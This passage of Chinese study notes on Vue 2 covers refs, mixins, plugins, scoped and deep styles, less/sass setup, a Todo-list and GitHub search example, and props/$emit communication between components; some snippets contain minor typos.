我们创建的单文件组件会汇总的App组件中 那我们的App组件是不是要在注册到vm里面才可以是么 那怎么创建vm组件呢?   
可不是通过上面的单文件组件的方式 我们要写js文件 亲自去new Vue

1. 引入 App 根组件
2. 创建Vue实例
3. 注册 App 组件

```js 
  // main.js 文件
  import App from './App'

  new Vue({
    el: '#root',
    components: {
      App
    },

    // 如果不想在index.html文件的root里写 调用app组件标签 也可以写在这里
    template: `
      <App />       
    `
  })
```

<br>

### index.html
该文件用于将组件 main.js 联系在一起 html文件中只写 div#root 就可以
```html
<body>
  <div id="root">

    <!-- 组件标签也可以写在 配置项的template中 -->
    <App />
  </div>

  <!-- 这里在脚手架中不用 只是写在这里让自己明白逻辑 -->
  <script src="../assets/js/vue.js"></script>
  <script src="./main.js"></script>
</body>
```

<br><br>

# ref属性
该属性在标签属性中使用 作用和id一样 可以给一个节点打上标识 用于获取该节点
```js 
<h3 ref='target'>我是App组件</h3>
```

<br>

### 设置ref的方法:
我们使用 ``ref="target"`` 的方式 在元素 or 组件上添加标签属性

<br>

### 获取ref的方法
```js
this.$refs.target
```

<br>

如获取当前节点:
```js 
this.$refs.target.innerHTML = '哈哈'
```

<br>

### 在组件上使用 ref 和 id 的区别:
- 通过 标签属性 id 获取的是 该组件的DOM结构
- 通过 标签属性 ref 获取的是 该组件的实例对象

<br>

### this.$refs 打印为undefined
在 mounted 里面打印 ``<component ref="target">`` 的 this.$refs.target 发现是undefined  

<br>

**为什么有的时候会出现未定义的情况呢?**  

<br>

<font color='#C2185B'>因为 ref 本身是作为渲染结果被创建的</font>, 在初始渲染的时候你不能访问它们

**它们还不存在!**

<br>

``$refs`` 也不是响应式的, 因此你不应该试图用它在模板中做数据绑定。**也就是说 ref 只有等页面加载完成好之后你才能调用 this.refs**

<br>

如果你使用v-if, v-for渲染页面的话, 那么在刚开始页面没没渲染之前你是拿不到this.refs 的, **所以要等到页面渲染之后拿才可以**

<br>

### 方式1: updated()
**如果你在mounted里获取this.refs, 因为dom还未完全加载, 所以你是拿不到的**  

update阶段则是完成了数据更新到 DOM 的阶段(对加载回来的数据进行处理), 此时, 就可以使用this.refs了。

<br>

### 方式2: setTimeout

<br>

### 方式3: mounted中使用 nextTick()

<br><br>

# mixins  混入 / 混合
所谓的混入就是当各个组件中有一个部分完全一样的时候 我们可以将这个部分抽离出来 在各自的组件中删除代码 引入抽离的文件

也就是说两个组件共享一个配置 复用配置项

<br>

### 使用mixins时 data 和 methods 配置项重复的情况下:
- 当混合文件中有 组件内部没有的时候 以混合文件为主  
- 当混合文件中没有 组件内部有 以组件内部的数据为主

<br>

### 使用mixins时 生命周期函数重复的情况下:
混合文件中的 和 组件中的生命周期都会调用

同名的钩子函数将合并为一个数组 因此都将被调用 另外**mixin对象的钩子**将在组件自身钩子**之前调用**

<br>

### 使用场景:
当组件的配置项中有重复的内容的时候 就可以使用混合 还可以将混合注册为全局混合

```js 
// 比如 两个组件都有 这样的一个地方 那么我就可以将这个部分抽离成一个js文件
methods: {
  showName() {
    console.log(this.name)
  }
}
```

<br>

### 使用方式:
在 根目录 中创建 mixins 文件夹 里面创建js文件  

暴露一个对象 对象中是vue的一个个配置项 methods data ...
```js 
export const hunhe = {
  methods: {
    showName() {
      console.log(this.name)
    }
  }
}
```

上面把共通代码抽离成了一个js文件 接下来我们就在要使用的组件内部引入他们然后使用 混合配置项

<br>

### 配置项: mixins: []
如果有配置项完全一致的时候可以使用混合的功能 抽离相同的配置项 然后在mixins配置项中使用混合是按配置项为单位进行抽离
```js 
import {hunhe} from 'mixin.js'

export default {
  mixins: [hunhe]
}
```

<br>

### 全局混合:
使用这种方式的混合所有的vm vc都会得到混合文件中的东西 我们在入口文件中 引入混合文件 和 配置

<br>

### Vue.mixin()
全局配置混合
```js 
import {hunhe, hunhe2} from 'mixin.js'
Vue.mixin(hunhe)
Vue.mixin(hunhe2)
```

<br>

### 要点:
1. data  
每个mixin都可以拥有自己的data 每个data函数都会被调用 并将返回结果合并 在数据的 property 发生冲突时 会以组件自身的数据为优先。

2. 值为对象的选项   
例如 methods、components 和 directives 将被合并为同一个对象。两个对象键名冲突时 取组件对象的键值对。

<br>

### 总结:
1. 混合中的this是该组件的对象
2. 混合中的所有数据都会被放在vm身上 所以正常使用数据 和 调用方法就可以

<br>

### 注意: 报错 named exportはエラーになるので
上面的方式是定义了一个js文件 然后通过在页面中引入js文件
```js
import {xxx} from "./mixins/xxx.js"
```

<br>

并在页面中通过 mixins配置项来注册使用的但是在项目中 这种方式 会有警告
```js 
named exportはエラーになるので
```

<br>

### 解决方案:
我们先了解一下 基本的概念

es6中 export 一般的用法有两种  
1. 命名导出 - named exports
2. 默认导出 - default exports

<br>

### 命名导出 named exports
就是每一个需要输出的数据类型都要有一个name 统一输入一定要带有{} 即便只有一个需要输出的数据类型。这种写法清爽直观 是推荐的写法。

<br>

### 默认导出 defaule exports
默认输出就不需要name了 但是一个js文件中只能有一个export default

我们在使用混合的使用 可以这么写
```html
<script>
  export default {
    data() {
      return {

      }
    }
  }
</script>
```

引入的时候 就相当于 引入组件的方式 这样警告就没有了

<br><br>

# 插件: plugins
插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种

- 添加全局方法或者 property。如: vue-custom-element
- 添加全局资源: 指令/过滤器/过渡等。如 vue-touch
- 通过全局混入来添加一些组件选项。如 vue-router
- 添加 Vue 实例方法, 通过把它们添加到 Vue.prototype 上实现。
- 一个库, 提供自己的 API, 同时提供上面提到的一个或多个功能。如 vue-route

<br>

Vue.use **会自动阻止多次注册相同插件**, 届时即使多次调用也只会注册一次该插件。

<br>

想要完成插件需要定义一个 plugins.js 文件 写插件

<br>

### 插件的定义方法: vue要求
1. 插件必须是一个对象
2. 对象内部含有install方法

<br>

这个插件vue会帮我们调用 就像是将所有的东西统一安装一样  
install方法中能够接收到 Vue 也就是vm的缔造者
```js 
export default {
  install(Vue, [接收到使用者传递的参数]) {
    // 比如我们可以在这里面配置n种全局配置 当vue帮我们调用这个install后 vm vc都能使用这些全局配置了 比如格式化 混入 自定义指令等等
  }
}
```

插件就相当于外挂一样 我们一般使用外挂都是先开启外挂然后再进入游戏 vue的插件也是一样的先应用插件然后创建vm

<br>

### **<font color='#C2185B'>Vue.use(Vue, [使用者传递的参数])</font>**
vue中使用这个api应用插件 

应用插件后 vue 会给我们调用 我们定制的插件中的方法  

express里面是使用express.use使用中间件

也就是说 入口文件里 创建 new Vue之间我们就先需要应用 我们定义的插件
```js 
import Vue from 'vue'
import App from './App'

// 引入插件
import plugins from './plugins'
Vue.config.productionTip = false

// 应用插件
Vue.use(plugins)

new Vue({
  el:'#app',
  render: h => h(App)
})
```

<br>

### Vue的按需加载实现思路:
比如我们开发了一个组件库 我们也希望能够做到 按需加载的逻辑
```
| - UI_Lib
  | - Button
    - index.vue
  | - input
    -index.vue
  
  - index.js
```

我们的UI库下面有两个组件 现在我们需要在Vue中安装我们的UI库 我们会使用 Vue.use(UI库) 是么

<br>

### 全部加载:
```js
import UI from "./plugins/index.js"
Vue.use(UI)
```

<br>

### 按需加载:
```js
// 第二个参数 可以被 install 的中的第二个参数options接收到
Vue.use(UI, {
  components: {
    "MyButton",
    "MyInput"
  }
})
```

```js
// 引入 Button Input 组件
import MyButton from "./Button/index.vue"
import MyInput from "./Input/index.vue"

const UI = {}

// options: 就是main.js文件中 Vue.use() 的第二个参数
UI.install = function(Vue, options) {
  console.log(options)
  // ["MyButton", "MyInput"]

/*
我们能从 options 身上拿到 我们 Vue.use() 的时候传入的信息 那么我们是不是就可以 利用 Vue 参数 将组件动态的添加到 Vue身上了
*/
}

export default UI
```

<br><br>

# ``<style scoped lang>`` 样式
我们在组件内写的style样式最终这些样式都会汇总到一起 所以同名的样式会被覆盖掉

会按照组件在App的组件中的引入的先后顺序 下面的组件的样式会覆盖掉上面的样式

<br>

### 组件内 ``<style scoped>``:
解决方式就是在 style标签里面添加 scoped 属性

我们加上这个属性之后 **该组件内的样式只负责该组件其它的样式不管**

<br>

**原理:**   
它会给写样式的div身上加一个自定义属性后面的数字都是随机生成的确保不一样
```js 
<div data-v-234234 class='demo'>
```

<br>

**注意:**  
app组件写样式的时候*不适合使用 scoped 这个样式*   
app是所有组件的源头 不加scoped就是修改全局的样式 一般App要是写样式了 代表所有组件都会用的

<br>

### 样式穿透: deep 的使用

一般在使用scoped后 **父组件的样式将不会渗透到子组件中** 而我们调用的element组件就相当于在父组件中使用子组件

```
| - 我们自己的组件
  | - ElementUI的组件(子组件)
```

<br>

### 书写方式:
这时候我们想改变element组件的部分样式时 就要在class类名前加上 /deep/ 或者 >>> 或者 ::v-deep

```scss
.(外层class) >>> .(内层class)
```

vue在解析样式的时候会在类名的后面加上[vasdf2323]之类的属性 当我们使用 deep 后该属性就会加在外层class上 获取我们修改的样式就会生效

```scss
.(外层class) .(内层class)[data-v-asfda123]
.(外层class) >>> .(内层class)   ---   .(外层class)[data-v-asfda123]  .(内层class)
```

<br>

```scss
.table-wrap /deep/ .el-table__header-wrapper .cell {
  padding-left: 0;
}
```

<br>

### scss中的使用方式:
```scss
::v-deep {
  img {
    width: 100%;
    height: auto;
  }
}
```

<br>

### 新版deep的使用方式
```scss
.map-floor-switch {
  &:deep(.v-label) {
    font-size: 12px;
  }
}

.app-combobox :deep(.v-input__control) {
  height: 32px !important;
  min-height: 30px !important;
}


:deep {
  // ボタン
  .form-button:not(:last-of-type) {
    margin-right: 16px;
  }
}
```

<br><br>

## less scss 的使用方式: ``<style lang='less'>``
我们在写样式的时候 可以使用less 直接这么写标签就可以了  
但是需要安装 less-loader

<br>

### less 使用方式:
**下载:**
```
npm i less less-loader@7
```

less版本 4xx 好处 好像也是最新的 可能会报错 因为不兼容 因为webpack的最新版本已经是5了 但是脚手架的话里面使用的webpack的版本可能是4

因为我们脚手架里面使用的是4.xx 

如果我们默认安装less-loader的话就是安装的最新版本 less-loader的最新版本是为了迎合webpack5

所以就发生了 我们脚手架里面是使用的是4 而我们却用了最新的less-loader

<br>

我们在安装less-loader前使用 如下命令 查看 webpack 的最新版本  
```
npm view webpack versions
npm view less-loader versions
```

我们可以指定7版本

<br>

### scss 使用方式:
vue环境下 经过测试这种搭配在 node: 14版本下可以正常的运行

<br>

**首先运行命令:**  
```
npm install --save-dev sass node-sass sass-loader


npm install --save-dev sass@1.55.0 node-sass@4.14.1 sass-loader@8.0.2
```

<br>

指定各个版本
```js
"node-sass": "^4.14.1",
"sass-loader": "^8.0.2",

"sass": "1.32.13",  // 这个并没有指定 没写这行 备忘用
```

<br><br>

# Todo案例:

### 数据放在哪个组件? 
我们对页面拆分组件后 要想数据在哪个组件展示 我们就放在哪个组件 也就是todolist案例里面

- 将列表做成了一个组件 -- MyList组件 
- 将列表中的每一项单独的做成了一个组件 -- MyItem组件

那就涉及到数据要放在哪里的问题 我们要将数据展示在MyList组件里面 所以我们就放在哪个组件里面

MyList组件只负责对数据的展示 并不负责操作数据

还可以放在最外层的结构上 这样传递数据的时候 又多了种可以层层传递的技巧

<br>

### 向子组件传递数据:
我们将数据放在了 MyList组件 里面 然后我们根据数据去遍历 列表中的每一项  

同时我们还要把子组件需要的数据传递进去 我们把 item in todos中的item传递到子组件里面
```html 
<!-- 父组件  传递过去一个todo -->
<MyItem v-for='item of todos' :todo='item'>

<!-- 子组件  声明接收一个todo -->
<span>{{todo.title}}</span>

<!-- 使用 props 配置项 -->
props: ['todo']
```

<br>

### 扩展: id 到底用什么类型的数据比较好? 
在js中数字型的id是有尽头的 一般都用字符串的类型

<br>

### 技巧: 怎么控制 标签内部的属性 有还是没有
或者我们使用三元表达式  

在上面的案例中我们直接去问todo.done就可以
```js 
<input type='checkbox' :checked='todo.done'>
```

<br>

### 案例内容: 按下回车后将用户输入的信息 生成新的一项
我们需要将用户的输入包装成一个todo对象
```js 
// 一个todo对象
{id: '001', title: '喝酒', done: false}

<input type='text' @keyuo.enter='add'>

methods: {
  add() {
    const todoObj = {
      id: nanoid(),
      title: e.target.value,
      done: false
    }
  }
}
```

<br>

### 扩展: nanoid的使用方式
1. npm i nanoid
2. import {nanoid} from 'nanoid'
3. nanoid是一个函数 直接调用生成唯一的字符串

<br>

**注意:**  
正常来说 我们在组织数据结构的时候不用组织id进到对象里 我们只需要整理其它的数据 数据库会自动给我们生成id  

- 随机数  
- 时间戳  
- uuid / nanoid  

它的算法是你目前所处的地理位置 加上电脑的mac地址 加上你的序列号


将我们包装起来的todoobj添加到数据的数组中就可以了  

<br>

**问题:**  
我们创建的 todoobj 是在 header组件里面 数据在 MyList 组件里面 怎么添加进去呢? 可以兄弟组件之间怎么传递数据呢? 
```js 
--- MyList      // -- 数据的存放位置
    --- MyItem

--- Header      // -- 用户输入 生成的信息obj
```

<br>

兄弟组件之间怎么传递数据:
- 事件总线
- 消息发布与订阅
- vuex

<br>

### 案例内容: 使用reduce方法 总结已完成的数据
```js
this.todos.reduce((pre, todo) => pre + (todo.done ? 1 : 0))
```

<br>

### 案例内容: □ 已完成2 / 全部3
什么时候前面需要打上对号?   

<br>

**思路:**   
已完成 和 全部都使用计算属性来说 我们可以在
```js 
checkbox checked = 变量1 === 变量2 && 变量2 > 0

// 也就是说 全部 要大于0 总数大于0并且变量1 2 相等的时候
```

<br>

### 案例内容: 将用户保存的数据 放在本地存储中
那什么时候往本地存储里面放呢? 我们使用watch监视属性 只要我们操作了todos那么我就把它放本地存储中放
```js 
data: {
  // todos: []
  todos: JSON.parse(localStorage.getItem('todos')) || []
}
/*
  我们使用监视属性 监视todos value就是todos最新的值 因为我们在添加的时候是将用户输入的信息整理成一个对象 然后使用vue认可的数组的方法 unshift 插入到数组中的

  这样添加进本地存储的都是最新的值
  如果修改内部对象里面的属性的时候 我们就开启深度监视
*/

watch: {
  todos: {

    deep: true,

    handler(value) {
      localStorage.setItem('todos', JSON.stringify(value))
    }
  }
}
```

<br>

### 案例内容: 编辑每一个todo项的内容
我们给每一行 todo 都添加一个编辑按钮 用于修改 睡觉  

当处于修改状态的时候 睡觉应该出现在一个input里面 当结束修改的时候 变成正常状态
```js 
□ 睡觉    ----   编辑  删除
```
```js
// 我们在写 checkbox 是否勾选的时候 使用的是一个变量来控制它是否选中 todo.done 来控制的
{
  id: nanoid(),
  title: e.target.value,
  done: false
}

/*
  现在我们要控制 文本是否处于编辑状态 也可以添加一个属性 
  isEdit为真 睡觉应该处于一个input里面 
  isEdit为假 正常显示文字
*/
  
{
  isEdit: false

  id: nanoid(),
  title: e.target.value,
  done: false
}
```

<br>

两个结构只有一个显示 根据一个变量控制 另一个使用v-if将变量取反
```html 
<div v-if='!isEdit'>{{name}}</div>
<div v-if='isEdit'><input type="text" :value='name'></div>
```

<br>

**注意:**  
往对象中添加属性的时候 我们要是想要响应式 也就是让vue监测到要使用
```js
this.$set(todo, "isEdit", true)
```

<br>

### 案例内容: 当点击编辑按钮后 输入框内的文本自动获取焦点
当我们如下操作的时候 并没有获取焦点 为什么? 
```js 
handle() {
  if(todo.hasOwnProperty('isEdit')) {
    todo.isEdit = true
  }

  this.$refs.inputTitle.focus()
}

/*
  我们的逻辑是: 
  逻辑是我们判断todo对象中有没有isEdit 如果有代表应该将 
  文本变为input框 + 文本的格式

  todo.isEdit = true

  当我们将isEdit设置为true的时候 vue就会监测到然后vue就会立刻的帮我们解析模板 然后input框就会出来了 然后我们执行这段代码

  this.$refs.inputTitle.focus()

  input框就会获取焦点

  ---

  但是真实的流程是这样的: !!!
  todo.isEdit = true
  这句话之后 Vue并没有马上帮我们解析模板 Vue是继续往下走 走了这句话 this.$refs.inputTitle.focus() 然后解析模板

  由于html结构的部分我们是用v-show控制着input的出现 走这句话的时候
  this.$refs.inputTitle.focus()

  input框还没有来到页面
  Vue是将里面所有的代码执行完毕才会解析模板
*/
```

<br>

**因为: Vue会将一个回调中的代码全部执行完毕才会去解析模板**  

<br>

### 解决方式1: 使用延时定时器
```js 
setTimeout(function() {
  this.$refs.inputTitle.focus()
}, 200)
```

<br>

### 解决方式2: this.$nextTick(callback)
``$nextTick``指定的回调会在dom节点更新后才会执行

```js 
// Vue会在模板解析完毕之后再调用里面的函数 这样就能保证会在节点更新后再去触碰节点
this.$nextTick(function() {
  this.$refs.inputTitle.focus()
})
```

<br>

### 总结: 组件化的编码流程
- 拆分静态组件 组件要按照功能点拆分 命名不要与html元素冲突
- 实现动态组件 考虑好数据的存放位置 数据是一个组件在用 还是一些组件在用  
  - 一个组件在用   
  - 一些组件在用 放在他们共同的父组件上这也是状态提升

- props适用于  
  - 父组件 -- 子组件 通信  
  - 子组件 -- 父组件 通信 要求父先给子一个函数

- 使用v-model的时候要切记 v-model绑定的值不能是props传递过来的值 因为props是不可以修改的

- props传过来的若是对象类型的值 修改对象中的属性时 vue不会报错 但不推荐这么做

<br><br>

# Github案例

<br>

### 引入外部样式库
项目中需要引入外部的ui库的时候 我们通常有2种方式存放ui样式库

<br>

### 将ui样式库存放在src文件夹下
- 在 src 文件夹内部创建 assets 文件夹 将boorstrap放入其中
- 在 App 组件 script部分 引入 boorstrap css样式

```js 
import ./assets/css/bootstrap.css'

export default {
  name: 'App',
}
```

<br>

**注意:**  
如果将样式库存放在 src / assets / 的时候 我们引入该样式就必须通过
import 引入

通过 import 引入的文件 webpack会严格的检车内部文件情况 以及依赖关系 如果存在问题会报错

<br>

### 将ui样式库存放在public文件夹下
- 在 public 文件夹下创建css文件夹 将boorstrap放入其中
- 在html文件中 通过 link标签引入
```js 
<link 
  rel="stylesheet" 
  href="<%= BASE_URL %>css/bootstrap.css"
>
```

<br>

### List组件 要根据请求数据的情况 呈现不同的信息
1. welcome
2. loading
3. users
4. 网络错误页面

<br>

我们不能根据 users数组的长度去判断是否要展示loading 
1. 因为页面上上来 users数组的长度就是0 但是我们要展示的是welcome
2. 如果网络错误请求回来的数据为空 users数组的长度也是0 但我们要展示的是网络错误页面

<br>

我们需要在 data 中设置也几个标识的变量
```js 
data: {
  isFirst: true
  isLoading: false    // 当点击搜索按钮的时候才是正在加载
  errMsg: ''
  users: []
}
```

<br>

页面上展示什么 根据上面的变量来决定 比如
```html
<!-- 展示用户数据 -->
<div v-show='users.length'>

<!-- 展示欢迎词 -->
<div v-show='isFirst'>

<!-- 展示加载中 -->
<div v-show='isLoading'>

<!-- 展示错误信息 -->
<div v-show='errMsg'>
```

<br>

上面的4个标识状态需要随着请求的发送 发生变化

<br>

### 情况1:
当我点击搜索按钮之后 这些值应该是什么样的? 
```js 
data: {
  isFirst: false      // 点按钮了 该状态 就不需要 欢迎词了 false
  isLoading: true     // 点按钮了 该状态 就是加载中 true
  errMsg: ''
  users: []
}
```

<br>

### 当一个对象中有4个属性 另一个对象中有3个属性 我想保留多出的一个属性 只替换重名的三个属性
```js 
this.info = {...this.info, ...dataObj}
```

<br><br>

# vue-resource
我们前面都是使用 axios 等库发送的请求  vue-resource 是一个插件库 现在这种方式用的不多了 我们作为了解

<br>

### 使用方式:
```
npm i vue-resource
```

<br>

在main.js文件中 注册刚才下载的 vue-resource
```js 
import Resource from 'vue-resource'
Vue.use(Resource)
    // 注册后 所有的vm vc身上都会多了一个 $http
```
<br>

### this.$http.get / post
这个 vue-resource 身上方法 用法 返回值 跟axios是一模一样的

<br><br>

# 组件之间的通信
下面就是组件之间的通信 我们将下面结构分成什么样 的组件? 

组件之间的通信就是数据之间的传递

```
------------------
|                |
|                |   -- > 轮播图
------------------

------------------
|                |
|                |  -- > 开发相关
------------------

------------------
|   ----------   |
|  |          |  |
|   ----------   |
|                |
|   ----------   |  -- > 列表部分 成
|  |          |  |       内部有小组件 小组件可以通过v-for遍历生成
|   ----------   |
|                |
|   ----------   |
|  |          |  |
|   ----------   |
------------------
```

我们上面一共有3个组件 第3个组件中有3个列表

当我们开发列表的时候肯定是先向服务器发送请求, 请求列表数据, 那请求列表数据这个动作(相关的请求代码)在哪里请求比较好?

<br>

整体是一个组件 3的列表部分是一个组件, 3列表里面又是小组件, 那请求相关的代码放在哪里比较合适

一般情况下 我们会在最外层最大的组件(也就是说包裹上面3个大组件的整体组件)内部写上发送请求的相关代码

发送请求后 我就能在最外层最大的组件内容拿到返回的数据了, 拿到数据后 我可以把数据存放在最外层最大的data里面 比如我们拿到的数据叫做 productList 一个商品列表

但是有一个问题, 我们最外层最大拿到的这个数据并不是它自己要使用的 而是交给下面第三个组件列表部分展示的 它才是最终展示列表的地方

这个时候我们就要做一个事情, 就是从我们请求到的 productList 数据传递给 3这个组件 只有传递过去后 才能在下面使用v-for的指令生成结构 变量

``v-for='(item, index) of productList'``  
然后再把item传递给3中的小组件, 让小组件根据item来创建一个个的列表结构

<br>

在上一节中, 我们提到了子组件是不能引用父组件或者Vue实例的数据的 但是, 在开发中, 往往一些数据确实需要从上层传递到下层

比如一个页面中, 我们从服务器请求到了很多的数据 其中一部分数据 并非是我们整个页面的大组件来展示的, 而是需要下面的子组件进行展示

这个时候, 并不会让子组件再次发送一个网络请求, 而是直接让大组件(父组件)将数据传递给小组件(子组件)

<br><br>

# 组件之间的数据传递: 父 -> 子 (props)

### 配置项 props:
props用于父子组件的相互通信也就是传递数据

该方式类似于微信转账 我这边给你转账 你需要点击确认收款 映射到props上就是 父组件向子组件传递数据 子组件要确认接收该数据

<br>

### 应用场景:
我们创建了一个组件 希望组件中的内容 是根据父组件传递的数据决定的 也就是组件在复用 数据是动态的

<br>

### 步骤1. 父组件在子组件标签属性部分 传递数据
**传递数据的方式有两种:**

```html
<!-- 情况1: 可以直接传递: 该种情况传递的只能是字符串 -->
<Son key="value">

<!-- 情况2: 使用v-bind传递: 传递 data配置项中定义好的数据 -->
<Son :key="value">
```

<br>

**示例:**  
```js 
<Student name='我是小暖暖' age='18'/>
// 这么传递 子组件接收的都是字符串

<Student :name='name' :age='18'/>
// 这么传递 即可以传递在data中的数据  也可以传递数字类型的数据
```

<br>

### 步骤2. 子组件在props配置项确认接收
父组件传递的数据会被收集在组件的实例对象上(vc) 也就是说只要vc身上有的属性 模板中都可以直接使用
```js 
props: ['name', 'age']
```

<br>

### props配置项: 对象形式
上面使用 props 的数组形式 进行了简单的 数据接收 这里我们可以使用对象形式 可以设置接收数据的 类型 和 默认值

子组件在接收props的同时可以对数据的类型做限制

<br>

**简单的类型限制:**  
子组件在接收的时候 props配置项为对象
```js
props: {
  接收数据的变量: String,
  接收数据的变量: Number,
}

props: {
  name: String,
  age: Number
}
```

<br>

**完整的类型限制:**  
子组件在接收的时候 props配置项为对象 同时每一个接收数据的变量的类型也是一个对象 用于配置更加丰富的限制信息
```js
props: {
  // 对象
  接收数据的变量: {
    type: String,
    required: true,
    default: 'sam'
  }
}
```

<br>

一般情况下 required 和 default 不会同时出现
```js  
props: {
  name: {
    type: String,
    required: true,
    default: 'sam'
  }
}
```

<br>

当 type 为 Array Object 的时候 default必须是一个函数且返回值就是默认值
```js 
props: {
  person: {
    type: Array | Object,

    default: () => [] | ({})

    default() {
      return []
    }
  }
}
```

<br>

数组的默认值
```js 
default: () => []
```

<br>

对象的默认值
```js 
default: () => ({})
```

<br>

函数的默认值
```js 
default: () => {}
```

<br>

### 限制属性:
- type:  
接收数据的数据类型 / 父组件传递进来的数据类型

- default:   
当模板中没有使用接收的数据时, 默认显示的数据注意type是什么类型, defaule就得写什么类型的值, 

- required: true  
当为true时, 父组件必须传递这个属性

<br>

### 自定义props的规则:
validator是props选项的一个验证函数, 用于验证传递给组件的属性值是否符合预期。

这个验证函数的返回值应为布尔类型, 返回 true 表示属性值有效, 返回 false 表示属性值无效。

当属性值无效时, Vue将会在控制台中发出警告。你可以使用这种方式来确保组件只接受有效的属性值, 以提高组件的健壮性和可维护性。

传递的属性值中必须是下面字符串中的一个
```js 
props: {
  父组件传递的属性: {
    validator: function(value) {
      return ['success', 'warning', 'danger'].indexOf(value) !== -1;
    }
  }
}
```

<br>

### 自定义props的类型:
我们还可以自定义函数用来验证别的类型(列表中没有的类型)
```js 
function Person(firstName, lastName) {
  this.firstName = firstName,
  this.lastName = lastName
}

Vue.component('blog-post', {
  props: {
    // 上面必须都是array object 我们自定义个类型Person
    author: Person
  }
})
```

<br>

### 技巧: props的方式 不仅能传递数据 还能传递方法
```js 
// 父组件中 在父组件标签内使用v-bind  父组件定义方法 子组件通过 props 传递到子组件
<app :addComment='addComment'>

methods: {
  addComment(comment) {
    this.comments.unshift(comment)
  }
}

// 子组件:
props: {
  addComment: {
    type: Function,
    required: true
  }
}

methods: {
  // 在子组件中通过this调用
  this.addComment(comment)
}
```

<br>

### props中 函数的默认值 使用示例:
**要点: props中的默认函数不要写成箭头函数 this 会丢**  

```js 
// 子组件
props: {
  // 子组件定义默认函数 函数中派发 send:data 事件
  fn: {
    type: Function,
    default: function(data) {
      this.$emit("send:data", data)
    }
  }
},

methods: {
  // 调用 props 中的 fn 函数
  handleClick() {
    this.fn("hello")
  }
}



// 父组件: 父组件中并没有向子组件传递fn函数
<Child @send:data="handleSend"/>
data() {
  return {
    title: "sam",
    msg: ""
  }
},
methods: {
  // 处理子组件派发的事件
  handleSend(data) {
    this.msg = data
  }
}
```

<br>

### props数据类型的验证都支持哪些数据类型呢?
- String
- Number
- Boolean
- Array
- Object
- Date
- Function
- Symbol
- null: 表示接受任意类型
- [Number,String]: 表示接受数字 和 字符串的类型

当我们有自定义构造函数时, 验证也支持自定义的类型

<br>

**注意:**  
- 子组件在声明接收的时候 父组件没有传递的属性 不要声明接收 就是不要瞎声明

- 接收到的props是不推荐改的 当它们是只读属性 要不vue会产生一些奇奇怪怪的问题(应该派发事件通知父组件来进行修改)

- 父组件在组件标签内部传递数据的变量 不能使用vue中预定义的变量名

- 当类型type是对象object 或者数组的时候 array 默认值default必须是一个函数 里面return一个数组 或者 对象
```js 
props: {
  cmovies: {
    type: String,
    default: 'aaa',     // 这样不行 改成

    default() {
      return [] or {}   // 这样的形式才可以
    }
  }
}
```

- **props的优先级高 它会覆盖掉data computed里面的同名数据**

<br><br>

# 组件之间的数据传递: 子 -> 父

```
      --- Pass Props --- >    

Patent(父组件)        child(子组件)

      < --- $emit Events --- 
```

<br>

## 父子通信: 利用回调
有些时候 我们需要子组件向父组件传递数据 那么怎么做呢

<br>

**1. 父组件利用props向子组件先传递方法**  

**2. 子组件调用props中的方法 并将数据当做实参传入**

**3. 父组件通过方法的形参使用数据**

<br>

```js 
// 父组件
<App>
  <MyList :receive='receive'></MyList>
</App>

methods: {
  // receive英语是接收的意思
  receive(todoObj) {
    // todoObj 就是 子组件 传递过来的数据
  }
}


// 子组件
props: ['receive']    // 这里是父组件传递过来的函数
methods: {
  // 子组件中的事件逻辑内部 调用父组件传递过来的事件
  add(e) {
    // 我们将这个数据 送回父组件
    const todoObj = {id:nanoid(), title: e.target.value, done: false}
    this.receive(todoObj)
  }
}
```

<br><br>

## 父子通信: 派发自定义事件
嵌套组件 当点击存放在子组件中的按钮 将子组件的 数据 交给它的父组件

<br>

### **<font color="#C2185B">this.$emit('事件名', [数据])</font>**  
子组件使用 this.$emit() 方法 发送数据

<br>

1. 子组件使用 emit 派发自定义事件 并携带数据
2. 父组件在子组件标签上监听派发出来的自定义事件 并指明处理数据的回调

<br>

### **<font color="#C2185B">父组件中 在子组件标签属性上使用 v-on绑定 子组件派发的自定义事件</font>**  
父组件在接收子组件发射过来的参数的时候 **可以这样 (name, ...a), 用于接收除了name以外的剩余参数**

**示例:**  
```js
// 父组件
<Son @customerEvent="handler">
// 还可以只绑定一次
<Son @customerEvent.once="handler">

methods: {
  handler(data) {
    console.log(data)
  }

  // 或者, args 用于接收除了name以外的剩余参数
  handler(name, ...args) {
    console.log(name)
  }
}


// 子组件
<button @click="send">click</button>

methods:{
  send() {
    this.$emit("customerEvent", this.msg)
  }
}
```

<br>

### 扩展: 监听子组件派发出来的事件的另一种方式

- 首先, 通过 ref 取得子组件实例  
- 然后, 通过 **子组件实例.$on()** 的方式 进行绑定事件  

<br>

该灵活性比较强 比如我可以等ajax请求回来后再去给子组件绑定事件
```js 
// 获取 子组件 实例
<Student ref='student'/>

// 挂载后再绑定
mounted() {
  this.refs.student.$on('子组件自定义事件名', 父组件中的回调)
}

// 只触发一次
mounted() {
  this.refs.student.$once('子组件自定义事件名', 父组件中的回调)
}
```

<br>

### 自定义事件的解绑:
我们在哪里使用$emit发射的事件 就在哪里解绑事件

<br>

### **<font color="#C2185B">this.$off('自定义事件名')</font>**  
只能解绑一个事件

<br>

### **<font color="#C2185B">this.$off(['自定义事件名1', '自定义事件名2'])</font>**  
只能解绑指定事件

<br>

### **<font color="#C2185B">this.$off()</font>**  
只能解绑全部事件

<br>

### 注意:
我们接收子组件通过自定义事件传递过来的数据的时候 **要将数据保存在data中 然后我们才能在模板中使用**

<br>

### 应用场景:
比如 现在一个网页中的分类侧边栏 里面有很多的选项

```
热门推荐
手机数码
电脑办公        内容区
计生情趣
美容护肤
```

像在这个小组件上的数据 其实都是从服务器获取的吧, 也就是说 我们外层最大的组件发送请求 将获取到的数组 传递给这个子组件, 在子组件中展示

但是这时候 因为里面有很多的选项, 比如页面上来的内容 属于 热门推荐里面的 这时我 点击了 手机数码, 应该显示手机数码里的内容了

这时候就要告诉父组件 子组件点击了谁 子组件里有很多的类别 我到底点击了哪一个类别呢?

- 如果我点击了 手机数码的类型, 父组件知道了后应该请求手机数码的数据 
- 如果我点击了 家电家器的类型, 父组件根据家电家器的类型请求对应数据

所以子组件里发生了事件, 我们告诉父组件发生了什么样的事件, 并且要告诉父组件 现在发生的事件 点击的数据是谁 得给父组件传递过去

因为给父组件传递过去, 父组件就能拿到一个变量 category = 'phone', 然后根据phone把phone发送到服务器去请求新一轮的数据

<br>

### 1. 子组件内定义数据
```js 
data() {
  return {
    // 定义要展示在页面中的数据
    categaries: [
